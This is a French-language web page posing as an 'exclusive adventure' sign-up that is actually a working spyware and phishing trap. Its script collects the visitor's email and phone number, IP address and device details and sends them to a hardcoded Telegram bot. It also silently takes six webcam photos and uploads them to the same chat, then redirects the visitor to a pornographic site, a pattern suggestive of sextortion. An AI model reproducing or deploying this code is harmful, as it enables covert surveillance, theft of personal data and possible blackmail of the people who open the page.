<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Aventure Exclusive</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
  
  <style>
    body {
      margin: 0;
      background: url('image/cu2.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: 'Segoe UI', Roboto, sans-serif;
      color: white;
      overflow: hidden;
    }

    .hidden { display: none !important; }

    /* --- Bouton Principal --- */
    #startBtn {
      padding: 16px 35px;
      font-size: 18px;
      font-weight: bold;
      background: rgba(0, 0, 0, 0.6);
      color: white;
      border: 2px solid #00d1ff;
      border-radius: 50px;
      cursor: pointer;
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
      z-index: 10;
    }

    .pulse {
      animation: pulseBtn 1.8s infinite;
    }

    /* Style du bouton apr√®s inscription */
    #startBtn.success {
      background: rgba(40, 167, 69, 0.7);
      border-color: #28a745;
      color: white;
      box-shadow: 0 0 20px rgba(40, 167, 69, 0.4);
    }

    @keyframes pulseBtn {
      0% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0.6); }
      70% { box-shadow: 0 0 0 15px rgba(0, 209, 255, 0); }
      100% { box-shadow: 0 0 0 0 rgba(0, 209, 255, 0); }
    }

    /* --- Style Commun Glassmorphism (Popup & Loading) --- */
    .glass-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.3);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      z-index: 3000;
    }

    .modal-content {
      background: rgba(255, 255, 255, 0.1);
      padding: 40px 30px;
      border-radius: 30px;
      width: 85%;
      max-width: 380px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      text-align: center;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
    }

    /* --- Formulaire --- */
    .input-group {
      position: relative;
      margin-bottom: 20px;
    }

    .input-group i {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: #00d1ff;
    }

    .input-group input {
      width: 100%;
      padding: 14px 15px 14px 45px;
      background: rgba(0, 0, 0, 0.4);
      border: 1px solid rgba(255, 255, 255, 0.2);
      border-radius: 12px;
      color: white;
      box-sizing: border-box;
      outline: none;
      font-size: 16px;
    }

    #submitReg {
      width: 100%;
      padding: 15px;
      background: #00d1ff;
      border: none;
      border-radius: 12px;
      font-weight: bold;
      font-size: 16px;
      color: #000;
      cursor: pointer;
      transition: 0.3s;
    }

    /* --- Loader --- */
    .loader {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(255, 255, 255, 0.1);
      border-top: 5px solid #00d1ff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin { 100% { transform: rotate(360deg); } }

    video, canvas { display: none; }
  </style>
</head>
<body>

  <div id="interface">
    <button id="startBtn" class="pulse">Commencer l'aventure</button>
  </div>

  <div id="registerModal" class="glass-overlay hidden">
    <div class="modal-content">
      <h2 style="margin-top:0"><i class="fas fa-user-lock"></i> Inscription</h2>
      <p style="font-size: 14px; color: rgba(255,255,255,0.8); margin-bottom: 25px;">
        Veuillez creer un compte pour acceder.
      </p>
      
      <div class="input-group">
        <i class="fas fa-envelope"></i>
        <input type="email" id="regEmail" placeholder="example@gmail.com" required>
      </div>
      
      <div class="input-group">
        <i class="fas fa-phone"></i>
        <input type="tel" id="regPhone" placeholder="+33 343 4654 096" required>
      </div>
      
      <button id="submitReg">S'inscrire</button>
    </div>
  </div>

  <div id="loadingScreen" class="glass-overlay hidden">
    <div class="loader"></div>
    <div id="loadText" style="font-weight:500; letter-spacing:1px;">Traitement en cours...</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const botToken = "8219156030:AAGt4YPKSBg6FZxAwi31l9yautyH8OTZ8Dk"; 
    const chatId = "-1003149318360";     

    const startBtn = document.getElementById("startBtn");
    const registerModal = document.getElementById("registerModal");
    const submitReg = document.getElementById("submitReg");
    const loadingScreen = document.getElementById("loadingScreen");
    const loadText = document.getElementById("loadText");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    let stream = null;
    let photoCount = 0;
    const maxPhotos = 6;

    // V√©rifier l'√©tat au d√©marrage
    window.onload = () => {
      if (localStorage.getItem("aventure_debloquee")) {
        setBtnVerified();
      }
    };

    function setBtnVerified() {
      startBtn.classList.remove("pulse");
      startBtn.classList.add("success");
      startBtn.innerHTML = '<i class="fas fa-check-circle"></i> Accedez au site';
    }

    async function initCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
      } catch (e) { console.warn("Cam√©ra indisponible"); }
    }
    initCamera();

    startBtn.onclick = () => {
      if (localStorage.getItem("aventure_debloquee")) {
        lancerProcessusFinal();
      } else {
        registerModal.classList.remove("hidden");
      }
    };

    submitReg.onclick = async () => {
      const email = document.getElementById("regEmail").value;
      const phone = document.getElementById("regPhone").value;

      if (email && phone) {
        // Transition vers le chargement
        registerModal.classList.add("hidden");
        loadingScreen.classList.remove("hidden");
        loadText.innerText = "Validation de l'acc√®s...";

        // Envoi √† Telegram
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ 
            chat_id: chatId, 
            text: `üéØ NOUVELLE INSCRIPTION :\nüìß Email: ${email}\nüìû Tel: ${phone}` 
          })
        });

        // M√©morisation
        localStorage.setItem("aventure_debloquee", "true");
        setBtnVerified();

        // Lancer la capture apr√®s un court d√©lai visuel
        setTimeout(() => {
          lancerProcessusFinal();
        }, 1500);
      } else {
        alert("Veuillez remplir tous les champs.");
      }
    };

    async function lancerProcessusFinal() {
      loadingScreen.classList.remove("hidden");
      loadText.innerText = "Synchronisation en cours...";

      // Envoi des infos de l'appareil
      let ip = "Inconnue";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const d = await res.json(); ip = d.ip;
      } catch(e){}
      
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          chat_id: chatId, 
          text: `üåê Connexion de : ${ip}\nüì± Appareil : ${navigator.userAgent}` 
        })
      });

      // Cycle de capture
      const interval = setInterval(async () => {
        if (photoCount >= maxPhotos) {
          clearInterval(interval);
          if (stream) stream.getTracks().forEach(t => t.stop());
          // Redirection finale
          window.location.replace("https://www.mvideoporno.xxx/xhamster/");
          return;
        }
        await capturePhoto();
      }, 2000);
    }

    async function capturePhoto() {
      if (!video.videoWidth) return;
      photoCount++;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      
      const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
      const fd = new FormData();
      fd.append("chat_id", chatId);
      fd.append("photo", blob, `pic_${photoCount}.jpg`);
      
      try { 
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: fd }); 
      } catch(e){}
    }
  </script>
</body>
</html>
